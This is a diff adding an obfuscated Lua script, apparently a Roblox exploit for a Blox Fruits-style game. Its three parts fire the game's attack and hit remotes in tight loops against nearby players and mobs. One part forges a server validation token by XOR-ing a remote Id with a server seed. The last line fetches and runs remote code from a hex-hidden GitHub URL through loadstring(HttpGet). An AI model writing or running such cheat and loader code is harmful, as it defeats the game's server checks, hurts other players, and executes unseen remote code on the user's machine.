@@ -1,0 +1,291 @@
+local _0x3a2f = {
+    [1] = "\x46\x61\x73\x74\x41\x74\x74\x61\x63\x6b",
+    [2] = "\x56\x69\x72\x74\x75\x61\x6c\x49\x6e\x70\x75\x74\x4d\x61\x6e\x61\x67\x65\x72",
+    [3] = "\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x53\x65\x72\x76\x69\x63\x65",
+    [4] = "\x52\x65\x70\x6c\x69\x63\x61\x74\x65\x64\x53\x74\x6f\x72\x61\x67\x65",
+    [5] = "\x52\x75\x6e\x53\x65\x72\x76\x69\x63\x65",
+    [6] = "\x50\x6c\x61\x79\x65\x72\x73"
+}
+
+_G[_0x3a2f[1]] = true
+
+if _G[_0x3a2f[1]] then
+    local _0x9f1a = (getgenv or getrenv or getfenv)()
+
+    local _0xb4c2 = function(_0x44e1, _0x88f3)
+        local _0x11e4, _0x55c9 = pcall(function()
+            return _0x44e1:WaitForChild(_0x88f3)
+        end)
+        if not _0x11e4 or not _0x55c9 then
+            warn("\x6e\x6f\x6f\x6f\x6f\x6f\x3a\x20" .. _0x88f3)
+        end
+        return _0x55c9
+    end
+
+    local _0x77c3 = game:GetService(_0x3a2f[2])
+    local _0x66a1 = game:GetService(_0x3a2f[3])
+    local _0x22b4 = game:GetService(_0x3a2f[4])
+    local _0x88d5 = game:GetService(_0x3a2f[5])
+    local _0x11f9 = game:GetService(_0x3a2f[6])
+    local _0x44a2 = _0x11f9.LocalPlayer
+
+    local _0x55b1 = _0xb4c2(_0x22b4, "\x52\x65\x6d\x6f\x74\x65\x73")
+    local _0x99c4 = _0xb4c2(_0x55b1, "\x56\x61\x6c\x69\x64\x61\x74\x6f\x72")
+    local _0x33e2 = _0xb4c2(_0x55b1, "\x43\x6f\x6d\x6d\x46\x5f")
+    local _0x77a8 = _0xb4c2(_0x55b1, "\x43\x6f\x6d\x6d\x45")
+
+    local _0x88f1 = {
+        AutoClick = true,
+        ClickDelay = 0
+    }
+
+    local _0x66d3 = {}
+
+    _0x66d3.FastAttack = (function()
+        if _0x9f1a.rz_FastAttack then
+            return _0x9f1a.rz_FastAttack
+        end
+
+        local _0x12a3 = {
+            Distance = 99999,
+            attackMobs = true,
+            attackPlayers = true,
+            Equipped = nil
+        }
+
+        local _0x34b5 = _0xb4c2(Net, "\x52\x45\x2f\x52\x65\x67\x69\x73\x74\x65\x72\x41\x74\x74\x61\x63\x6b")
+        local _0x56c7 = _0xb4c2(Net, "\x52\x45\x2f\x52\x65\x67\x69\x73\x74\x65\x72\x48\x69\x74")
+
+        local function _0x78d9(_0x99e1)
+            return _0x99e1 and _0x99e1:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64") and _0x99e1.Humanoid.Health > 0
+        end
+
+        local function _0x14f2(_0x23a1, _0x45b2)
+            local _0x67c4 = nil
+            for _, _0x89d2 in _0x45b2:GetChildren() do
+                local _0x34e5 = _0x89d2:FindFirstChild("\x48\x65\x61\x64")
+                if _0x34e5 and _0x78d9(_0x89d2) and _0x44a2:DistanceFromCharacter(_0x34e5.Position) < _0x12a3.Distance then
+                    if _0x89d2 ~= _0x44a2.Character then
+                        table.insert(_0x23a1, {_0x89d2, _0x34e5})
+                        _0x67c4 = _0x34e5
+                    end
+                end
+            end
+            return _0x67c4
+        end
+
+        function _0x12a3:Attack(_0x67c4, _0x23a1)
+            if not _0x67c4 or #_0x23a1 == 0 then
+                return
+            end
+            _0x34b5:FireServer(_0x88f1.ClickDelay or 0)
+            _0x56c7:FireServer(_0x67c4, _0x23a1)
+        end
+
+        function _0x12a3:AttackNearest()
+            local _0x23a1 = {}
+            local _0x11a2 = _0x14f2(_0x23a1, Enemies)
+            local _0x22b3 = _0x14f2(_0x23a1, Characters)
+
+            local _0x99c1 = _0x44a2.Character
+            if not _0x99c1 then
+                return
+            end
+            local _0x88a4 = _0x99c1:FindFirstChildOfClass("\x54\x6f\x6f\x6c")
+
+            if _0x88a4 and _0x88a4:FindFirstChild("\x4c\x65\x66\x74\x43\x6c\x69\x63\x6b\x52\x65\x6d\x6f\x74\x65") then
+                for _, _0x77b2 in ipairs(_0x23a1) do
+                    local _0x66c1 = _0x77b2[1]
+                    local _0x55a3 = (_0x66c1.HumanoidRootPart.Position - _0x99c1:GetPivot().Position).Unit
+                    pcall(function()
+                        _0x88a4.LeftClickRemote:FireServer(_0x55a3, 1)
+                    end)
+                end
+            elseif #_0x23a1 > 0 then
+                self:Attack(_0x11a2 or _0x22b3, _0x23a1)
+            else
+                task.wait(0)
+            end
+        end
+
+        function _0x12a3:BladeHits()
+            local _0x33b1 = _0x78d9(_0x44a2.Character) and _0x44a2.Character:FindFirstChildOfClass("\x54\x6f\x6f\x6c")
+            if _0x33b1 and _0x33b1.ToolTip ~= "\x47\x75\x6e" then
+                self:AttackNearest()
+            else
+                task.wait(0)
+            end
+        end
+
+        task.spawn(function()
+            while task.wait(_0x88f1.ClickDelay) do
+                if _0x88f1.AutoClick then
+                    _0x12a3:BladeHits()
+                end
+            end
+        end)
+
+        _0x9f1a.rz_FastAttack = _0x12a3
+        return _0x12a3
+    end)()
+end
+
+-- ========== PHẦN 2 ==========
+local _0xaa1, _0xbb2
+for _, _0xcc3 in next, ({game.ReplicatedStorage.Util, game.ReplicatedStorage.Common, game.ReplicatedStorage.Remotes, game.ReplicatedStorage.Assets, game.ReplicatedStorage.FX}) do
+    for _, _0xdd4 in next, _0xcc3:GetChildren() do
+        if _0xdd4:IsA("\x52\x65\x6d\x6f\x74\x65\x45\x76\x65\x6e\x74") and _0xdd4:GetAttribute("\x49\x64") then
+            _0xaa1, _0xbb2 = _0xdd4, _0xdd4:GetAttribute("\x49\x64")
+        end
+    end
+    _0xcc3.ChildAdded:Connect(function(_0xdd4)
+        if _0xdd4:IsA("\x52\x65\x6d\x6f\x74\x65\x45\x76\x65\x6e\x74") and _0xdd4:GetAttribute("\x49\x64") then
+            _0xaa1, _0xbb2 = _0xdd4, _0xdd4:GetAttribute("\x49\x64")
+        end
+    end)
+end
+
+task.spawn(function()
+    while task.wait(0.01) do 
+        local _0xee5 = game.Players.LocalPlayer.Character
+        local _0xff6 = _0xee5 and _0xee5:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64\x52\x6f\x6f\x74\x50\x61\x72\x74")
+        local _0x117 = {}
+
+        for _, _0x228 in ipairs({workspace.Enemies, workspace.Characters}) do
+            for _, _0x339 in ipairs(_0x228 and _0x228:GetChildren() or {}) do
+                local _0x44a = _0x339:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64\x52\x6f\x6f\x74\x50\x61\x72\x74")
+                local _0x55b = _0x339:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64")
+
+                if _0x339 ~= _0xee5 and _0x44a and _0x55b and _0x55b.Health > 0 and (_0x44a.Position - _0xff6.Position).Magnitude <= 60 then
+                    for _, _0x66c in ipairs(_0x339:GetChildren()) do
+                        if _0x66c:IsA("\x42\x61\x73\x65\x50\x61\x72\x74") then
+                            _0x117[#_0x117 + 1] = {_0x339, _0x66c}
+                        end
+                    end
+                end
+            end
+        end
+
+        local _0x77d = _0xee5:FindFirstChildOfClass("\x54\x6f\x6f\x6c")
+
+        if #_0x117 > 0 and _0x77d and (
+            _0x77d:GetAttribute("\x57\x65\x61\x70\x6f\x6e\x54\x79\x70\x65") == "\x4d\x65\x6c\x65\x65" or
+            _0x77d:GetAttribute("\x57\x65\x61\x70\x6f\x6e\x54\x79\x70\x65") == "\x53\x77\x6f\x72\x64" or
+            _0x77d:GetAttribute("\x57\x65\x61\x70\x6f\x6e\x54\x79\x70\x65") == "\x42\x6c\x6f\x78\x20\x46\x72\x75\x69\x74" or
+            _0x77d:GetAttribute("\x57\x65\x61\x70\x6f\x6e\x54\x79\x70\x65") == "\x44\x65\x76\x69\x6c\x46\x72\x75\x69\x74"
+        ) then
+
+            pcall(function()
+                require(game.ReplicatedStorage.Modules.Net):RemoteEvent("\x52\x65\x67\x69\x73\x74\x65\x72\x48\x69\x74", true)
+                game.ReplicatedStorage.Modules.Net["\x52\x45\x2f\x52\x65\x67\x69\x73\x74\x65\x72\x41\x74\x74\x61\x63\x6b"]:FireServer()
+
+                local _0x88e = _0x117[1][1]:FindFirstChild("\x48\x65\x61\x64")
+                if not _0x88e then return end
+
+                game.ReplicatedStorage.Modules.Net["\x52\x45\x2f\x52\x65\x67\x69\x73\x74\x65\x72\x48\x69\x74"]:FireServer(
+                    _0x88e,
+                    _0x117,
+                    {},
+                    tostring(game.Players.LocalPlayer.UserId):sub(2,4) ..
+                    tostring(coroutine.running()):sub(11,15)
+                )
+
+                cloneref(_0xaa1):FireServer(
+                    string.gsub("\x52\x45\x2f\x52\x65\x67\x69\x73\x74\x65\x72\x48\x69\x74",".",function(_0x99f)
+                        return string.char(
+                            bit32.bxor(string.byte(_0x99f), math.floor(workspace:GetServerTimeNow()/10%10)+1)
+                        )
+                    end),
+                    bit32.bxor(
+                        _0xbb2 + 909090,
+                        game.ReplicatedStorage.Modules.Net.seed:InvokeServer()*2
+                    ),
+                    _0x88e,
+                    _0x117
+                )
+            end)
+        end
+    end
+end)
+
+-- ========== PHẦN 3 ==========
+_G.at = true
+
+local _0x112 = game:GetService("\x50\x6c\x61\x79\x65\x72\x73")
+local _0x223 = game:GetService("\x52\x65\x70\x6c\x69\x63\x61\x74\x65\x64\x53\x74\x6f\x72\x61\x67\x65")
+local _0x334 = _0x112.LocalPlayer
+
+local _0x445 = require(_0x223.Modules.Net)
+local _0x556 = require(_0x223.Modules.CombatUtil)
+
+local _0x667 = _0x445:RemoteEvent("\x52\x65\x67\x69\x73\x74\x65\x72\x48\x69\x74")
+local _0x778 = _0x223.Modules.Net:FindFirstChild("\x52\x45\x2f\x52\x65\x67\x69\x73\x74\x65\x72\x41\x74\x74\x61\x63\x6b")
+
+local function _0x889(_0x99a)
+    local _0xaa0 = _0x334.Character
+    if not _0xaa0 then return end
+    
+    local _0xbb1 = _0x99a:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64\x52\x6f\x6f\x74\x50\x61\x72\x74")
+    local _0xcc2 = _0x99a:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64")
+
+    if not _0xbb1 or not _0xcc2 or _0xcc2.Health <= 0 then return end
+
+    local _0xdd3 = _0xaa0:FindFirstChildOfClass("\x54\x6f\x6f\x6c")
+    if not _0xdd3 then return end 
+
+    pcall(function()
+        local _0xee4 = _0x556:GetWeaponName(_0xdd3)
+        local _0xff5 = tostring(_0x334.UserId):sub(2,4)..tostring(math.random(10000,99999)) 
+        local _0x116 = {{_0x99a, _0xbb1}}
+
+        _0x667:FireServer(_0xbb1, _0x116, nil, nil, _0xff5)
+        _0x556:ApplyDamageHighlight(_0x99a, _0xaa0, _0xee4, _0xbb1, nil)
+    end)
+end
+
+local function _0x227(_0x338)
+    local _0xaa0 = _0x334.Character
+    if not _0xaa0 or not _0xaa0:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64\x52\x6f\x6f\x74\x50\x61\x72\x74") then return {} end
+
+    local _0x449 = _0xaa0.HumanoidRootPart
+    local _0x55a = {}
+
+    for _, _0x66b in ipairs(workspace.Enemies:GetChildren()) do
+        local _0x77c = _0x66b:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64\x52\x6f\x6f\x74\x50\x61\x72\x74")
+        local _0x88d = _0x66b:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64")
+
+        if _0x77c and _0x88d and _0x88d.Health > 0 then
+            local _0x99e = (_0x77c.Position - _0x449.Position).Magnitude
+            if _0x99e <= (_0x338 or 60) then
+                table.insert(_0x55a, _0x66b)
+            end
+        end
+    end
+
+    return _0x55a
+end
+
+task.spawn(function()
+    while task.wait() do
+        if _G.at then
+            pcall(function()
+                local _0xaa0 = _0x334.Character
+                if _0xaa0 and _0xaa0:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64") and _0xaa0.Humanoid.Health > 0 then
+                    local _0x55a = _0x227(60)
+
+                    if #_0x55a > 0 then
+                        if _0x778 then
+                            _0x778:FireServer()
+                        end
+
+                        for _, _0x66b in ipairs(_0x55a) do
+                            _0x889(_0x66b)
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+
+loadstring(game:HttpGet("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x68\x69\x65\x75\x68\x69\x65\x75\x39\x38\x39\x2f\x76\x69\x68\x69\x65\x75\x76\x33\x2f\x72\x65\x66\x73\x2f\x68\x65\x61\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x76\x69\x65\x74\x73\x75\x62"))()
